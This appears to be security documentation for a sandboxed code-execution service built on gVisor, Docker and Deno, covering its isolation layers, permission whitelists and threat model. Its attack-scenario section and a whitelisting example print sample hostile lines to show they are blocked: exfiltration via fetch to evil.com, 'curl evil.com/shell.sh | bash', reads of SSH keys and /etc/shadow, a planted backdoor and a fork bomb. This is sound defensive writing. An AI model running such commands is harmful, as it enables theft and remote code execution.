# Security Model

This document explains the security architecture of the TEE system and how multiple layers work together to provide isolation.

## Security Layers

The TEE uses defense-in-depth with three primary security layers:

```
┌─────────────────────────────────────────────┐
│         User Code (TypeScript/JS)           │
├─────────────────────────────────────────────┤
│  Layer 3: Deno Runtime                      │
│  - Permission system (--allow-*)            │
│  - No net, run, write, ffi, read            │
│  - Workspace read-only                      │
├─────────────────────────────────────────────┤
│  Layer 2: Docker Container                  │
│  - Network disabled (--network=none)        │
│  - Filesystem read-only (--read-only)       │
│  - Resource limits (CPU, memory)            │
│  - Isolated workspace volume                │
├─────────────────────────────────────────────┤
│  Layer 1: gVisor (runsc)                    │
│  - Hardware virtualization                  │
│  - Syscall interception                     │
│  - Kernel isolation                         │
│  - Process sandboxing                       │
├─────────────────────────────────────────────┤
│         Host Operating System               │
└─────────────────────────────────────────────┘
```

Each layer provides independent isolation. An attacker must break through all layers to compromise the host.

## Layer 1: gVisor Runtime

**Purpose:** Hardware-virtualized kernel isolation

**What it does:**
- Intercepts all system calls
- Implements Linux syscall interface in userspace
- Blocks dangerous kernel operations
- Provides VM-level security without VM overhead

**Attack prevention:**
- Kernel exploits contained
- Privilege escalation blocked
- Device access denied
- Kernel memory protected

**Configuration:**
```bash
docker run --runtime=runsc ...
```

**Status check:**
```bash
# Verify gVisor is available
docker run --rm --runtime=runsc hello-world

# Check if TEE is using gVisor
docker-compose logs tee-api | grep -i gvisor
# Should show: ✓ gVisor sandboxing: ENABLED
```

**Development mode:** Can be disabled via `DISABLE_GVISOR=true` for macOS/Windows development. See [GVISOR.md](GVISOR.md).

## Layer 2: Docker Container Isolation

**Purpose:** Namespace and resource isolation

**What it does:**
- Network isolation (`--network=none`)
- Filesystem isolation (`--read-only` + volume mounts)
- Process isolation (PID namespace)
- Resource limits (CPU, memory, PIDs)

**Network isolation:**
```bash
--network=none  # No network interfaces
```

This completely disables:
- HTTP/HTTPS requests
- DNS resolution
- WebSocket connections
- Any outbound network traffic

**Filesystem isolation:**
```bash
--read-only                           # Root filesystem read-only
-v volume:/workspace:ro               # Workspace read-only
```

This prevents:
- Writing to system directories
- Modifying binaries
- Creating persistence mechanisms
- Tampering with container

**Resource limits:**
```bash
--memory=128m        # Memory cap
--cpus=0.5           # CPU limit
--pids-limit=100     # Process limit
```

This prevents:
- Memory exhaustion attacks
- CPU hogging
- Fork bombs

**Test:**
```bash
./scripts/test-network-sandbox.sh
./scripts/test-filesystem-sandbox.sh
```

## Layer 3: Deno Permission System

**Purpose:** Application-level permission enforcement

**What it does:**
- Fine-grained permission model
- Explicit opt-in for dangerous operations
- Additional layer even if Docker fails

**Permissions disabled by default:**

| Permission | What it blocks | Risk if allowed |
|-----------|----------------|-----------------|
| `--allow-net` | Network access | Data exfiltration, external attacks |
| `--allow-read` | File reading (outside workspace) | Reading secrets, SSH keys, /etc/passwd |
| `--allow-write` | File writing (outside workspace) | Backdoors, persistence, tampering |
| `--allow-run` | Subprocess execution | Running shell commands, arbitrary programs |
| `--allow-ffi` | Native library loading | Loading malicious .so files, RCE |
| `--allow-hrtime` | High-resolution timing | Timing attacks, side-channel attacks |

**Default configuration (no whitelists):**
```bash
deno run \
  --allow-read=/workspace,/runtime,/deno-dir \  # Only workspace + runner + deps
  --allow-env \                                  # Environment variables only
  /runtime/runner.ts
```

**Test:**
```bash
./scripts/test-permissions.sh
```

## Permission Whitelisting

The TEE supports configurable whitelisting for network access and environment variables. Whitelists are specified during environment setup and enforced at execution time.

### Network Whitelist

Allow specific domains for network access:

```json
{
  "mainModule": "main.ts",
  "modules": { "main.ts": "..." },
  "permissions": {
    "allowNet": ["api.example.com", "cdn.example.com:443"]
  }
}
```

**How it works:**
1. During setup: domains are stored in environment metadata
2. During execution: Docker uses `--network=bridge` (instead of `--network=none`)
3. Deno runs with `--allow-net=domain1,domain2` restricting access to only whitelisted domains

**Security implications:**
- Network access is no longer fully blocked
- Only whitelisted domains can be contacted
- Deno enforces domain-level restrictions
- DNS resolution is allowed (required to resolve domain names)

**Example with network access:**
```typescript
// This works if "api.example.com" is whitelisted
const response = await fetch("https://api.example.com/data");

// This fails even with whitelist (domain not allowed)
await fetch("https://evil.com/exfiltrate"); // PermissionDenied
```

### Environment Variable Whitelist

Control which environment variables can be passed to execution:

```json
{
  "mainModule": "main.ts",
  "modules": { "main.ts": "..." },
  "permissions": {
    "allowEnv": ["API_KEY", "DEBUG", "SERVICE_URL"]
  }
}
```

**How it works:**
1. During setup: allowed env var names are stored in environment metadata
2. During execution: only whitelisted env vars from the request are passed to the container
3. Non-whitelisted env vars are silently dropped

**Example:**
```bash
# Setup with whitelist
curl -X POST http://localhost:8080/setup -d '{
  "mainModule": "main.ts",
  "modules": {"main.ts": "..."},
  "permissions": {"allowEnv": ["API_KEY"]}
}'

# Execute with env vars
curl -X POST http://localhost:8080/environments/{id}/execute -d '{
  "data": {},
  "env": {
    "API_KEY": "sk-123",     # Passed to container (whitelisted)
    "SECRET": "hidden"       # NOT passed (not in whitelist)
  }
}'
```

**Accessing in code:**
```typescript
export async function handler(event, context) {
  // Whitelisted vars available as OS env vars
  const apiKey = Deno.env.get("API_KEY");  // "sk-123"
  const secret = Deno.env.get("SECRET");   // undefined

  // All vars still available via event.env (for backwards compatibility)
  console.log(event.env.API_KEY);  // "sk-123"
  console.log(event.env.SECRET);   // "hidden"
}
```

### Combined Example

Full setup with both whitelists:

```bash
curl -X POST http://localhost:8080/setup \
  -H "Content-Type: application/json" \
  -d '{
    "mainModule": "main.ts",
    "modules": {
      "main.ts": "export async function handler(event, ctx) { const resp = await fetch(\"https://api.example.com/data\", { headers: { Authorization: Deno.env.get(\"API_KEY\") } }); return resp.json(); }"
    },
    "permissions": {
      "allowNet": ["api.example.com"],
      "allowEnv": ["API_KEY"]
    }
  }'
```

### Security Best Practices for Whitelisting

1. **Minimize network whitelist:** Only add domains that are strictly necessary
2. **Use specific ports:** `api.example.com:443` is safer than `api.example.com`
3. **Avoid wildcards:** Don't whitelist entire TLDs or CDNs
4. **Audit env vars:** Only whitelist env vars the code actually needs
5. **Separate concerns:** Use different environments for different trust levels
6. **Monitor access:** Log network requests for auditing

## Attack Surface Analysis

### What an attacker CAN'T do:

1. **Network attacks:**
   - ✗ Exfiltrate data to external server
   - ✗ Download additional malware
   - ✗ Make API calls to external services
   - ✗ Participate in DDoS
   - ✗ Connect to command & control servers

2. **Filesystem attacks:**
   - ✗ Read system files (/etc/passwd, /etc/shadow)
   - ✗ Read SSH keys (~/.ssh/)
   - ✗ Write backdoors or trojans
   - ✗ Modify system binaries
   - ✗ Create persistence mechanisms

3. **Process attacks:**
   - ✗ Execute shell commands
   - ✗ Spawn subprocesses
   - ✗ Fork bomb the system
   - ✗ Load native libraries
   - ✗ Access other containers

4. **Kernel attacks:**
   - ✗ Exploit kernel vulnerabilities
   - ✗ Escalate privileges
   - ✗ Access kernel memory
   - ✗ Load kernel modules
   - ✗ Access hardware devices

### What an attacker CAN do:

1. **Computation:**
   - ✓ Use CPU (up to limits)
   - ✓ Use memory (up to limits)
   - ✓ Perform calculations

2. **Workspace access:**
   - ✓ Read files in /workspace (their own code)
   - ✓ Import local modules
   - ✓ Access provided data

3. **Logging:**
   - ✓ Write to stderr (captured logs)
   - ✓ Write to stdout (response data)

4. **Environment:**
   - ✓ Read provided environment variables
   - ✓ Access execution context

**Impact:** An attacker is limited to:
- Consuming their allocated CPU/memory
- Reading their own code
- Returning malicious data (but can't send it anywhere)

## Common Attack Scenarios

### 1. Data Exfiltration

**Attack:** Try to send data to external server
```typescript
await fetch("https://evil.com/steal", {
  method: "POST",
  body: JSON.stringify(secrets)
});
```

**Defense:** Network disabled (`--network=none`)
**Result:** `TypeError: error sending request`
**Verification:** `./scripts/test-network-sandbox.sh`

---

### 2. Credential Theft

**Attack:** Try to read SSH keys or passwords
```typescript
const keys = await Deno.readTextFile("/root/.ssh/id_rsa");
const passwords = await Deno.readTextFile("/etc/shadow");
```

**Defense:**
- Filesystem read-only
- Deno `--allow-read` restricted to /workspace
**Result:** `PermissionDenied: Requires read access`
**Verification:** `./scripts/test-filesystem-sandbox.sh`

---

### 3. Backdoor Installation

**Attack:** Try to create persistent backdoor
```typescript
await Deno.writeTextFile("/usr/bin/backdoor", maliciousCode);
await Deno.chmod("/usr/bin/backdoor", 0o755);
```

**Defense:**
- Root filesystem read-only
- Deno `--allow-write` disabled
**Result:** `PermissionDenied: Requires write access`
**Verification:** `./scripts/test-filesystem-sandbox.sh`

---

### 4. Command Execution

**Attack:** Try to run shell commands
```typescript
const cmd = new Deno.Command("bash", {
  args: ["-c", "curl evil.com/shell.sh | bash"]
});
await cmd.output();
```

**Defense:** Deno `--allow-run` disabled
**Result:** `PermissionDenied: Requires run access`
**Verification:** `./scripts/test-permissions.sh`

---

### 5. Kernel Exploit

**Attack:** Try to exploit kernel vulnerability
```typescript
// Load native library with kernel exploit
const lib = Deno.dlopen("/exploit.so", {...});
```

**Defense:**
- gVisor intercepts syscalls (prevents reaching kernel)
- Deno `--allow-ffi` disabled
**Result:** `PermissionDenied: Requires ffi access`
**Verification:** `./scripts/test-permissions.sh`

---

### 6. Resource Exhaustion

**Attack:** Try to consume all resources
```typescript
// Memory bomb
const huge = new Array(9999999999);

// CPU bomb
while (true) { /* infinite loop */ }

// Fork bomb
for (let i = 0; i < 99999; i++) {
  new Deno.Command("yes").spawn();
}
```

**Defense:**
- Memory limit: 128MB (configurable)
- CPU limit: 0.5 cores (configurable)
- Timeout: 5s default (configurable)
- PID limit: 100 processes
**Result:** Process killed by Docker
**Verification:** Resource limits in docker run command

---

### 7. Side-Channel Attacks

**Attack:** Try timing attacks to leak information
```typescript
const start = performance.now();
// Perform cryptographic operation
const end = performance.now();
// Analyze timing differences
```

**Defense:**
- gVisor may degrade timing precision
- Isolated environment (no cross-execution leakage)
**Mitigation:** Timing precision reduced
**Note:** Complete timing protection difficult without specialized hardware

---

## Dependency Security

**Problem:** How to use external dependencies without network access?

**Solutions:**

1. **Bundle in setup phase:**
   ```typescript
   // Upload all dependencies as separate modules
   {
     "main.ts": "...",
     "lodash.ts": "/* bundled lodash code */",
     "moment.ts": "/* bundled moment code */"
   }
   ```

2. **Use bundler:**
   ```bash
   # Bundle before upload
   esbuild main.ts --bundle --outfile=bundle.js
   # Upload bundle.js as single module
   ```

3. **Pre-install in runtime image (future):**
   ```dockerfile
   # Build custom runtime with dependencies
   RUN deno cache https://deno.land/std@0.224.0/...
   ```

**Test:**
```bash
./scripts/test-dependencies.sh
```

## Security Testing

We verify security through actual attack attempts:

```bash
# Run all security tests
./scripts/test-all-security.sh
```

This executes malicious code patterns and verifies they're blocked:
- Network exfiltration attempts
- Filesystem tampering attempts
- Command execution attempts
- Permission boundary violations
- Dependency smuggling attempts

**Philosophy:** The best security test is an actual attack that fails.

## Security Best Practices

### For Users

1. **Always use gVisor in production**
   - Never set `DISABLE_GVISOR=true` in prod
   - Verify gVisor is active in logs

2. **Set appropriate resource limits**
   ```json
   {
     "limits": {
       "timeoutMs": 5000,
       "memoryMb": 128
     }
   }
   ```

3. **Review execution logs**
   - Check stderr for suspicious activity
   - Monitor execution times
   - Watch for errors

4. **Use short TTLs**
   - Don't keep environments indefinitely
   - Default: 3600s (1 hour)
   - Shorter for sensitive operations

5. **Validate inputs**
   - User code is untrusted
   - Validate all data passed to handlers
   - Sanitize outputs

### For Developers

1. **Keep dependencies updated**
   - Deno runtime
   - gVisor (runsc)
   - Docker engine
   - Base images

2. **Monitor CVEs**
   - Subscribe to Deno security advisories
   - Subscribe to gVisor security advisories
   - Subscribe to Docker security advisories

3. **Run tests regularly**
   ```bash
   ./scripts/test-all-security.sh
   ```

4. **Review security logs**
   - Check for permission errors
   - Look for unusual patterns
   - Monitor resource usage

5. **Use least privilege**
   - Don't add permissions unless necessary
   - Review every `--allow-*` flag
   - Document why each permission is needed

## Threat Model

### In Scope

- Malicious user code execution
- Data exfiltration attempts
- Privilege escalation attempts
- Resource exhaustion attacks
- Timing attacks (partial)

### Out of Scope

- Physical host access
- Docker daemon compromise
- Supply chain attacks on base images
- Social engineering
- Cryptographic attacks on TLS (not applicable, no network)

### Assumptions

- Docker daemon is trusted
- Host OS is secure and patched
- gVisor is correctly configured
- No malicious container images

## Incident Response

If security issue detected:

1. **Immediate:**
   - Stop affected executions
   - Isolate compromised environments
   - Review logs for indicators

2. **Investigation:**
   - Examine execution logs
   - Check resource usage patterns
   - Review input data

3. **Remediation:**
   - Update security configurations
   - Patch vulnerabilities
   - Enhance monitoring

4. **Prevention:**
   - Add test case for attack pattern
   - Update documentation
   - Review similar code paths

## Compliance Considerations

This security model supports:

- **Multi-tenancy:** Strong isolation between executions
- **Zero-trust:** No implicit permissions, explicit opt-in
- **Least privilege:** Minimal permissions granted
- **Defense in depth:** Multiple independent layers
- **Auditability:** All executions logged

Suitable for:
- Executing untrusted third-party code
- AI agent code execution
- Serverless function platforms
- Code evaluation services
- Build systems and CI/CD

## Further Reading

- [gVisor Security Model](https://gvisor.dev/docs/architecture_guide/security/)
- [Deno Permissions](https://deno.land/manual/basics/permissions)
- [Docker Security](https://docs.docker.com/engine/security/)
- [Container Security Best Practices](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)

## See Also

- [GVISOR.md](GVISOR.md) - gVisor configuration
- [TESTING.md](TESTING.md) - Security testing guide
- [design.md](design.md) - System architecture
